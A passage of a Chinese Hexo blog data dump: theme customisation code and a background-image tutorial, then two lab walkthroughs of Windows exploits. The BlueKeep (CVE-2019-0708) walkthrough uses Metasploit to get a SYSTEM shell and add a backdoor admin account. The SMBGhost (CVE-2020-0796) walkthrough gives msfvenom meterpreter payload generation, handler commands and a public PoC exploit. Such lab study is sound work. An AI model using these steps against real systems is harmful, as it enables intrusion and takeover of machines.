div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>我一直使用的是Next的主题，这个主题默认是可以自定义一些样式的。</p>\n<h3 id=\"添加图片\"><a href=\"#添加图片\" class=\"headerlink\" title=\"添加图片\"></a>添加图片</h3><p>首先选择一张心仪的背景图片，添加到themes&#x2F;next&#x2F;source&#x2F;images&#x2F;xx.jpg。我建议图片的大小最好控制一下，最好控制在400k-500K左右，动辄几兆大小的背景图片网页加载起来会很吃力，非常影响实际体验。</p>","more":"<h3 id=\"取消注释\"><a href=\"#取消注释\" class=\"headerlink\" title=\"取消注释\"></a>取消注释</h3><p>然后需要打开这个开关，也就是取消style这个注释</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">custom_file_path:</span><br><span class=\"line\">  <span class=\"comment\">#head: source/_data/head.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#header: source/_data/header.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#sidebar: source/_data/sidebar.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#postMeta: source/_data/post-meta.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#postBodyEnd: source/_data/post-body-end.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#footer: source/_data/footer.swig</span></span><br><span class=\"line\">  <span class=\"comment\">#bodyEnd: source/_data/body-end.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#variable: source/_data/variables.styl</span></span><br><span class=\"line\">  <span class=\"comment\">#mixin: source/_data/mixins.styl</span></span><br><span class=\"line\">  style: <span class=\"built_in\">source</span>/_data/styles.styl</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"创建文件\"><a href=\"#创建文件\" class=\"headerlink\" title=\"创建文件\"></a>创建文件</h3><p>取消注释以后，创建这样的一个文件source&#x2F;_data&#x2F;styles.styl，需要注意的是，这个source是站点目录下的source，而不是主题目录下的source。</p>\n<p>创建好之后，在文件插入以下代码：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">body &#123;</span><br><span class=\"line\">  background:url(/images/xx.jpg);</span><br><span class=\"line\">  background-repeat: no-repeat;</span><br><span class=\"line\">  background-attachment:fixed;</span><br><span class=\"line\">  background-position:100% 100%;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>background:url 为图片路径，也可以直接使用链接。</li>\n<li>background-repeat：若果背景图片不能全屏，那么是否平铺显示，充满屏幕</li>\n<li>background-attachment：背景是否随着网页上下滚动而滚动，fixed 为固定</li>\n<li>background-size：图片展示大小，这里设置 100%，100% 的意义为：如果背景图片不能全屏，那么是否通过拉伸的方式将背景强制拉伸至全屏显示。</li>\n</ul>\n<p>重新生成一下配置，就会出现效果了。</p>\n<h3 id=\"补充\"><a href=\"#补充\" class=\"headerlink\" title=\"补充\"></a>补充</h3><p>已经取消注释的文件对应的功能和教程链接。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">文件</th>\n<th align=\"center\">功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">footer</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/07/17/FlyLine/\">背景”小飞棍”</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">bodyEnd</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-FoldCode/\">折叠代码</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">variable</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-fillet/\">设置圆角</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">style</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/07/17/BGPic/\">背景图片</a><strong>、</strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-transparency/\">博客透明度</a><strong>、</strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-FoldCode/\">折叠代码</a></strong></td>\n</tr>\n</tbody></table>"},{"title":"远程桌面提权（CVE-2019-0708）","date":"2023-04-22T15:05:04.000Z","_content":"\n### 准备工作\n\n首先需要准备两台虚拟机，一台运行kali linux，另一台运行的是windows7，目标机开启3389端口,关闭防火墙，在计算机高级系统设置中远程桌面设置允许。\n\n### 开始攻击\n\n1. 还是使用我们熟悉的```msfconsole```工具,进入之后搜索***0708***。\n\n<!-- more -->\n\n![启动工具](./CVE-2019-0708/1.png)\n\n2. 使用编号是1的模块，然后设置***payload***，这是为了攻击成功之后不会蓝屏，而是给我们弹回一个```shell```。使用```options```查看需要设置的参数，从图中可以看到需要设置目标机器的IP。\n\n![启动工具](./CVE-2019-0708/2.png)\n\n3. 我们需要额外设置一个参数```targets```。使用```show targets```查看选项，选择最贴合我们情况的，我选择了windows的VMware。\n\n![启动工具](./CVE-2019-0708/3.png)\n\n4. 设置完就可以run起来了，稍作等待，成功返回```shell```,验证一下我们的权限，是系统用户没有错。\n\n![启动工具](./CVE-2019-0708/4.png)\n\n5. 我们尝试在系统中添加一个用户***hacker***，密码设置为“1234”。\n\n![启动工具](./CVE-2019-0708/5.png)\n\n6. 然后把***hacker***添加到管理员组。\n\n![启动工具](./CVE-2019-0708/6.png)\n\n7. 再启动一个终端，输入```rdesktop 192.168.20.130```，这里跟着的是目标机器的IP。然后kali会弹出一个新页面，就是windows的登录页面，我们使用刚刚创建的用户和密码登录。\n\n![启动工具](./CVE-2019-0708/7.png)\n\n8. 最后kali成功远程登录windows，任务完成。\n\n![启动工具](./CVE-2019-0708/8.png)","source":"_posts/CVE-2019-0708.md","raw":"---\ntitle: 远程桌面提权（CVE-2019-0708）\ndate: 2023-04-22 23:05:04\ncategories: 技术\ntags:\n  - 网络安全\n---\n\n### 准备工作\n\n首先需要准备两台虚拟机，一台运行kali linux，另一台运行的是windows7，目标机开启3389端口,关闭防火墙，在计算机高级系统设置中远程桌面设置允许。\n\n### 开始攻击\n\n1. 还是使用我们熟悉的```msfconsole```工具,进入之后搜索***0708***。\n\n<!-- more -->\n\n![启动工具](./CVE-2019-0708/1.png)\n\n2. 使用编号是1的模块，然后设置***payload***，这是为了攻击成功之后不会蓝屏，而是给我们弹回一个```shell```。使用```options```查看需要设置的参数，从图中可以看到需要设置目标机器的IP。\n\n![启动工具](./CVE-2019-0708/2.png)\n\n3. 我们需要额外设置一个参数```targets```。使用```show targets```查看选项，选择最贴合我们情况的，我选择了windows的VMware。\n\n![启动工具](./CVE-2019-0708/3.png)\n\n4. 设置完就可以run起来了，稍作等待，成功返回```shell```,验证一下我们的权限，是系统用户没有错。\n\n![启动工具](./CVE-2019-0708/4.png)\n\n5. 我们尝试在系统中添加一个用户***hacker***，密码设置为“1234”。\n\n![启动工具](./CVE-2019-0708/5.png)\n\n6. 然后把***hacker***添加到管理员组。\n\n![启动工具](./CVE-2019-0708/6.png)\n\n7. 再启动一个终端，输入```rdesktop 192.168.20.130```，这里跟着的是目标机器的IP。然后kali会弹出一个新页面，就是windows的登录页面，我们使用刚刚创建的用户和密码登录。\n\n![启动工具](./CVE-2019-0708/7.png)\n\n8. 最后kali成功远程登录windows，任务完成。\n\n![启动工具](./CVE-2019-0708/8.png)","slug":"CVE-2019-0708","published":1,"updated":"2024-05-03T03:55:54.713Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5cv000a7zj32gg32qjp","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h3><p>首先需要准备两台虚拟机，一台运行kali linux，另一台运行的是windows7，目标机开启3389端口,关闭防火墙，在计算机高级系统设置中远程桌面设置允许。</p>\n<h3 id=\"开始攻击\"><a href=\"#开始攻击\" class=\"headerlink\" title=\"开始攻击\"></a>开始攻击</h3><ol>\n<li>还是使用我们熟悉的<code>msfconsole</code>工具,进入之后搜索<em><strong>0708</strong></em>。</li>\n</ol>\n<span id=\"more\"></span>\n\n<p><img src=\"/2023/04/22/CVE-2019-0708/1.png\" alt=\"启动工具\"></p>\n<ol start=\"2\">\n<li>使用编号是1的模块，然后设置<em><strong>payload</strong></em>，这是为了攻击成功之后不会蓝屏，而是给我们弹回一个<code>shell</code>。使用<code>options</code>查看需要设置的参数，从图中可以看到需要设置目标机器的IP。</li>\n</ol>\n<p><img src=\"/2023/04/22/CVE-2019-0708/2.png\" alt=\"启动工具\"></p>\n<ol start=\"3\">\n<li>我们需要额外设置一个参数<code>targets</code>。使用<code>show targets</code>查看选项，选择最贴合我们情况的，我选择了windows的VMware。</li>\n</ol>\n<p><img src=\"/2023/04/22/CVE-2019-0708/3.png\" alt=\"启动工具\"></p>\n<ol start=\"4\">\n<li>设置完就可以run起来了，稍作等待，成功返回<code>shell</code>,验证一下我们的权限，是系统用户没有错。</li>\n</ol>\n<p><img src=\"/2023/04/22/CVE-2019-0708/4.png\" alt=\"启动工具\"></p>\n<ol start=\"5\">\n<li>我们尝试在系统中添加一个用户<em><strong>hacker</strong></em>，密码设置为“1234”。</li>\n</ol>\n<p><img src=\"/2023/04/22/CVE-2019-0708/5.png\" alt=\"启动工具\"></p>\n<ol start=\"6\">\n<li>然后把<em><strong>hacker</strong></em>添加到管理员组。</li>\n</ol>\n<p><img src=\"/2023/04/22/CVE-2019-0708/6.png\" alt=\"启动工具\"></p>\n<ol start=\"7\">\n<li>再启动一个终端，输入<code>rdesktop 192.168.20.130</code>，这里跟着的是目标机器的IP。然后kali会弹出一个新页面，就是windows的登录页面，我们使用刚刚创建的用户和密码登录。</li>\n</ol>\n<p><img src=\"/2023/04/22/CVE-2019-0708/7.png\" alt=\"启动工具\"></p>\n<ol start=\"8\">\n<li>最后kali成功远程登录windows，任务完成。</li>\n</ol>\n<p><img src=\"/2023/04/22/CVE-2019-0708/8.png\" alt=\"启动工具\"></p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h3><p>首先需要准备两台虚拟机，一台运行kali linux，另一台运行的是windows7，目标机开启3389端口,关闭防火墙，在计算机高级系统设置中远程桌面设置允许。</p>\n<h3 id=\"开始攻击\"><a href=\"#开始攻击\" class=\"headerlink\" title=\"开始攻击\"></a>开始攻击</h3><ol>\n<li>还是使用我们熟悉的<code>msfconsole</code>工具,进入之后搜索<em><strong>0708</strong></em>。</li>\n</ol>","more":"<p><img src=\"/2023/04/22/CVE-2019-0708/1.png\" alt=\"启动工具\"></p>\n<ol start=\"2\">\n<li>使用编号是1的模块，然后设置<em><strong>payload</strong></em>，这是为了攻击成功之后不会蓝屏，而是给我们弹回一个<code>shell</code>。使用<code>options</code>查看需要设置的参数，从图中可以看到需要设置目标机器的IP。</li>\n</ol>\n<p><img src=\"/2023/04/22/CVE-2019-0708/2.png\" alt=\"启动工具\"></p>\n<ol start=\"3\">\n<li>我们需要额外设置一个参数<code>targets</code>。使用<code>show targets</code>查看选项，选择最贴合我们情况的，我选择了windows的VMware。</li>\n</ol>\n<p><img src=\"/2023/04/22/CVE-2019-0708/3.png\" alt=\"启动工具\"></p>\n<ol start=\"4\">\n<li>设置完就可以run起来了，稍作等待，成功返回<code>shell</code>,验证一下我们的权限，是系统用户没有错。</li>\n</ol>\n<p><img src=\"/2023/04/22/CVE-2019-0708/4.png\" alt=\"启动工具\"></p>\n<ol start=\"5\">\n<li>我们尝试在系统中添加一个用户<em><strong>hacker</strong></em>，密码设置为“1234”。</li>\n</ol>\n<p><img src=\"/2023/04/22/CVE-2019-0708/5.png\" alt=\"启动工具\"></p>\n<ol start=\"6\">\n<li>然后把<em><strong>hacker</strong></em>添加到管理员组。</li>\n</ol>\n<p><img src=\"/2023/04/22/CVE-2019-0708/6.png\" alt=\"启动工具\"></p>\n<ol start=\"7\">\n<li>再启动一个终端，输入<code>rdesktop 192.168.20.130</code>，这里跟着的是目标机器的IP。然后kali会弹出一个新页面，就是windows的登录页面，我们使用刚刚创建的用户和密码登录。</li>\n</ol>\n<p><img src=\"/2023/04/22/CVE-2019-0708/7.png\" alt=\"启动工具\"></p>\n<ol start=\"8\">\n<li>最后kali成功远程登录windows，任务完成。</li>\n</ol>\n<p><img src=\"/2023/04/22/CVE-2019-0708/8.png\" alt=\"启动工具\"></p>"},{"title":"永恒之黑（CVE-2020-0796）","date":"2023-04-21T02:10:13.000Z","_content":"\n### 惭愧声明\n稍微了解一点就会知道，CVE-2020-0796是可以拿到shell的，但是因为技术能力的限制，到现在复现bug我也没有拿到shell，只会让靶机蓝屏重启。先把博客更了，等后续搞明白了，再来更新。\n\n### 准备工作\n\n首先，准备一台kali和一台运行1903版本或者1909版本的windows10。\n\n<!-- more -->\n\n关闭windows10的防火墙和实时保护功能。\n\n在kali上准备待会要用到的工具。\n\n1. 启用扫描脚本\n\n```git\n  git clone https://github.com/ollypwn/SMBGhost.git\n```\n\n有人说这个脚本不准确，有时候检测超时也会报bug可利用，这个脚本也不太重要，至少对于这个实验来说。\n\n2. 下载EXP脚本\n\n```git\n  git clone https://github.com/chompie1337/SMBGhost_RCE_PoC.git\n```\n\n### 扫描bug\n\n准备好扫描脚本后进入该目录，执行：\n\n```python\n  python3 scanner.py 192.168.20.135\n```\n\n\"192.168.20.135\"更换为自己靶机的IP。下面是效果图，显示\"Vulnerable\"，易受攻击的。\n\n![bug扫描](./CVE-2020-0796/1.png)\n\n### 准备payload\n\n进入使用EXP脚本的SMBGhost_RCE_PoC目录，执行：\n\n```bash\n  msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -f py -o payload\n```\n\n执行之后会在SMBGhost_RCE_PoC目录下生成payload文件。接下来很重要的步骤：\n\n1. 打开payload。\n\n2. 打开exploit.py。\n\n3. 将payload中“buf”字段全部替换为“USER_PAYLOAD”字段。\n\n4. 复制替换完成的payload文件内容。\n\n5. 粘贴到（覆盖）exploit.py文件USER_PAYLOAD区域。\n\n![修改payload](./CVE-2020-0796/2.png)\n\n### 开始攻击\n\n1. 启动```msfconsole```。\n\n2. 使用模块。\n\n3. 设置有效载荷和相关参数。\n\n依次执行以下命令：\n\n```bash\n  msfconsole -q\n  use exploit/multi/handler\n  set payload windows/x64/meterpreter/bind_tcp\n  set lport 4444\n  set rhost 192.168.20.135\n  run\n```\n\n![攻击](./CVE-2020-0796/3.png)\n\n再打开一个终端，进入SMBGhost_RCE_PoC目录，运行：\n\n```bash\n  python3 exploit.py -ip 192.168.20.135\n```\n\n![运行 exploit.py](./CVE-2020-0796/4.png)\n\n出现这步后按下回车。\n\n然后回到win10，发现win10蓝屏正在重启。\n\n![win10重启](./CVE-2020-0796/5.png)\n\n如果完成的彻底，```msfconsole```终端会弹出meterpreter，但是很遗憾，我没有拿到靶机的shell。\n\n![拿到shell](./CVE-2020-0796/6.png)\n\n---\n\n手动分割线\n\n---\n\n### 玄学排错\n\n接着上次的来说，上次是没有拿到shell的。经过一些网上拍错和别的同学的交流，得到了一些启发，最终成功拿到了shell。其中有很多问题也是很玄学的。\n\n1. 把靶机的内存设置大一点，我直接给到了8G。\n\n2. kali和靶机的连通最好不要使用NAT连接，如果使用NAT连接，建议把宿主机的防火墙和病毒保护也关闭。\n\n3. 在靶机中要在控制面板-程序-启用或关闭windows的功能-打开SMB开关，然后重启。\n\n4. 在进行paylod-code生成的时候，尽量不要使用原有的4444端口（我用的9876）。\n\n5. 更换了windows的镜像，重新安装了一个虚拟机，镜像保存在了[百度云盘](https://pan.baidu.com/s/1M1GvWoMcJc5nZA_tS4tang)里，提取码：0731。\n\n### 成功的尝试\n\n生成payload-code。\n\n![](./CVE-2020-0796/9.png)\n\n然后替换exploit.py文件中user_payload字段。\n\n![](./CVE-2020-0796/10.png)\n\n前面的操作还是一样，进入工具，使用模块，设置payload。\n\n![](./CVE-2020-0796/7.png)\n\n设置攻击参数。\n\n![](./CVE-2020-0796/8.png)\n\n执行run命令并在此等候。\n\n![](./CVE-2020-0796/11.png)\n\n然后再开一个终端\n\n![](./CVE-2020-0796/12.png)\n\n成功拿到shell，是管理员的权限没有错。\n\n![](./CVE-2020-0796/13.png)","source":"_posts/CVE-2020-0796.md","raw":"---\ntitle: 永恒之黑（CVE-2020-0796）\ndate: 2023-04-21 10:10:13\ncategories: 技术\ntags:\n    - 网络安全\n---\n\n### 惭愧声明\n稍微了解一点就会知道，CVE-2020-0796是可以拿到shell的，但是因为技术能力的限制，到现在复现bug我也没有拿到shell，只会让靶机蓝屏重启。先把博客更了，等后续搞明白了，再来更新。\n\n### 准备工作\n\n首先，准备一台kali和一台运行1903版本或者1909版本的windows10。\n\n<!-- more -->\n\n关闭windows10的防火墙和实时保护功能。\n\n在kali上准备待会要用到的工具。\n\n1. 启用扫描脚本\n\n```git\n  git clone https://github.com/ollypwn/SMBGhost.git\n```\n\n有人说这个脚本不准确，有时候检测超时也会报bug可利用，这个脚本也不太重要，至少对于这个实验来说。\n\n2. 下载EXP脚本\n\n```git\n  git clone https://github.com/chompie1337/SMBGhost_RCE_PoC.git\n```\n\n### 扫描bug\n\n准备好扫描脚本后进入该目录，执行：\n\n```python\n  python3 scanner.py 192.168.20.135\n```\n\n\"192.168.20.135\"更换为自己靶机的IP。下面是效果图，显示\"Vulnerable\"，易受攻击的。\n\n![bug扫描](./CVE-2020-0796/1.png)\n\n### 准备payload\n\n进入使用EXP脚本的SMBGhost_RCE_PoC目录，执行：\n\n```bash\n  msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -f py -o payload\n```\n\n执行之后会在SMBGhost_RCE_PoC目录下生成payload文件。接下来很重要的步骤：\n\n1. 打开payload。\n\n2. 打开exploit.py。\n\n3. 将payload中“buf”字段全部替换为“USER_PAYLOAD”字段。\n\n4. 复制替换完成的payload文件内容。\n\n5. 粘贴到（覆盖）exploit.py文件USER_PAYLOAD区域。\n\n![修改payload](./CVE-2020-0796/2.png)\n\n### 开始攻击\n\n1. 启动```msfconsole```。\n\n2. 使用模块。\n\n3. 设置有效载荷和相关参数。\n\n依次执行以下命令：\n\n```bash\n  msfconsole -q\n  use exploit/multi/handler\n  set payload windows/x64/meterpreter/bind_tcp\n  set lport 4444\n  set rhost 192.168.20.135\n  run\n```\n\n![攻击](./CVE-2020-0796/3.png)\n\n再打开一个终端，进入SMBGhost_RCE_PoC目录，运行：\n\n```bash\n  python3 exploit.py -ip 192.168.20.135\n```\n\n![运行 exploit.py](./CVE-2020-0796/4.png)\n\n出现这步后按下回车。\n\n然后回到win10，发现win10蓝屏正在重启。\n\n![win10重启](./CVE-2020-0796/5.png)\n\n如果完成的彻底，```msfconsole```终端会弹出meterpreter，但是很遗憾，我没有拿到靶机的shell。\n\n![拿到shell](./CVE-2020-0796/6.png)\n\n---\n\n手动分割线\n\n---\n\n### 玄学排错\n\n接着上次的来说，上次是没有拿到shell的。经过一些网上拍错和别的同学的交流，得到了一些启发，最终成功拿到了shell。其中有很多问题也是很玄学的。\n\n1. 把靶机的内存设置大一点，我直接给到了8G。\n\n2. kali和靶机的连通最好不要使用NAT连接，如果使用NAT连接，建议把宿主机的防火墙和病毒保护也关闭。\n\n3. 在靶机中要在控制面板-程序-启用或关闭windows的功能-打开SMB开关，然后重启。\n\n4. 在进行paylod-code生成的时候，尽量不要使用原有的4444端口（我用的9876）。\n\n5. 更换了windows的镜像，重新安装了一个虚拟机，镜像保存在了[百度云盘](https://pan.baidu.com/s/1M1GvWoMcJc5nZA_tS4tang)里，提取码：0731。\n\n### 成功的尝试\n\n生成payload-code。\n\n![](./CVE-2020-0796/9.png)\n\n然后替换exploit.py文件中user_payload字段。\n\n![](./CVE-2020-0796/10.png)\n\n前面的操作还是一样，进入工具，使用模块，设置payload。\n\n![](./CVE-2020-0796/7.png)\n\n设置攻击参数。\n\n![](./CVE-2020-0796/8.png)\n\n执行run命令并在此等候。\n\n![](./CVE-2020-0796/11.png)\n\n然后再开一个终端\n\n![](./CVE-2020-0796/12.png)\n\n成功拿到shell，是管理员的权限没有错。\n\n![](./CVE-2020-0796/13.png)","slug":"CVE-2020-0796","published":1,"updated":"2024-05-03T03:55:54.721Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5cz000d7zj3cnr04hc6","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"惭愧声明\"><a href=\"#惭愧声明\" class=\"headerlink\" title=\"惭愧声明\"></a>惭愧声明</h3><p>稍微了解一点就会知道，CVE-2020-0796是可以拿到shell的，但是因为技术能力的限制，到现在复现bug我也没有拿到shell，只会让靶机蓝屏重启。先把博客更了，等后续搞明白了，再来更新。</p>\n<h3 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h3><p>首先，准备一台kali和一台运行1903版本或者1909版本的windows10。</p>\n<span id=\"more\"></span>\n\n<p>关闭windows10的防火墙和实时保护功能。</p>\n<p>在kali上准备待会要用到的工具。</p>\n<ol>\n<li>启用扫描脚本</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  git clone https://github.com/ollypwn/SMBGhost.git</span><br></pre></td></tr></table></figure>\n\n<p>有人说这个脚本不准确，有时候检测超时也会报bug可利用，这个脚本也不太重要，至少对于这个实验来说。</p>\n<ol start=\"2\">\n<li>下载EXP脚本</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  git clone https://github.com/chompie1337/SMBGhost_RCE_PoC.git</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"扫描bug\"><a href=\"#扫描bug\" class=\"headerlink\" title=\"扫描bug\"></a>扫描bug</h3><p>准备好扫描脚本后进入该目录，执行：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  python3 scanner.py <span class=\"number\">192.168</span><span class=\"number\">.20</span><span class=\"number\">.135</span></span><br></pre></td></tr></table></figure>\n\n<p>“192.168.20.135”更换为自己靶机的IP。下面是效果图，显示”Vulnerable”，易受攻击的。</p>\n<p><img src=\"/2023/04/21/CVE-2020-0796/1.png\" alt=\"bug扫描\"></p>\n<h3 id=\"准备payload\"><a href=\"#准备payload\" class=\"headerlink\" title=\"准备payload\"></a>准备payload</h3><p>进入使用EXP脚本的SMBGhost_RCE_PoC目录，执行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -f py -o 